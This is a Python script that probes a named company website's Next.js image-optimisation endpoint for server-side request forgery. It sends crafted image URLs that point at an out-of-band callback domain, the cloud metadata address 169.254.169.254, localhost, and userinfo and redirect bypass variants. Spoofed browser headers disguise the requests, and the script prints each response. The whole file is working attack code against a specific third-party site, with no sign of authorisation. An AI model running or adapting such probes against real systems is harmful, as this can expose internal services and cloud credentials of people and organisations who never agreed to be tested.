import requests, urllib.parse, time, random
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
H={"User-Agent":UA,
   "Accept":"image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
   "Accept-Language":"en-US,en;q=0.9",
   "Sec-Fetch-Dest":"image","Sec-Fetch-Mode":"no-cors","Sec-Fetch-Site":"same-origin",
   "Referer":"https://www.infinitycapital.bh/"}
B="https://www.infinitycapital.bh"
def q(u): return urllib.parse.quote(u,safe='')
host="oobe51ec405f9bd.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
real="https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg"
tests=[
 ("baseline_home","/"),
 ("img_real_640","/_next/image?url="+q(real)+"&w=640&q=75"),
 ("img_real_640b","/_next/image?url="+q(real)+"&w=640&q=75"),
 ("oob_png","/_next/image?url="+q("http://"+host+"/ssrf1.png")+"&w=640&q=75"),
 ("oob_jpg","/_next/image?url="+q("http://"+host+"/ssrf2.jpg")+"&w=1080&q=75"),
 ("oob_https","/_next/image?url="+q("https://"+host+"/ssrf3.png")+"&w=256&q=75"),
 ("internal_meta","/_next/image?url="+q("http://169.254.169.254/latest/meta-data/")+"&w=640&q=75"),
 ("internal_localhost","/_next/image?url="+q("http://127.0.0.1:3000/")+"&w=640&q=75"),
 ("oob_dotpng_local","/_next/image?url="+q("http://"+host+"@127.0.0.1/x.png")+"&w=640&q=75"),
 ("redirect_test","/_next/image?url="+q("http://"+host+"/redir")+"&w=640&q=75"),
]
for name,path in tests:
    try:
        r=requests.get(B+path,headers=H,timeout=30,allow_redirects=False)
        t=r.headers.get('content-type','')
        print(name, r.status_code, len(r.content), t, "|", r.headers.get('x-vercel-mitigated') or r.headers.get('server'))
        print("   ", r.content[:120])
    except Exception as e:
        print(name,"ERR",repr(e))
    time.sleep(3)
